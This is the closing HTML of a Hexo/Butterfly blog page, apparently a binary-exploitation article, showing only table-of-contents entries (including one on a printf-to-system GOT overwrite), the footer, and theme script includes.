class="toc-text">通过修改printf函数GOT表为system实现GetShell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Summary"><span class="toc-number">1.0.4.</span> <span class="toc-text">4.Summary</span></a></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 By Firework</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi,welcome to my world.Hava a good day!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
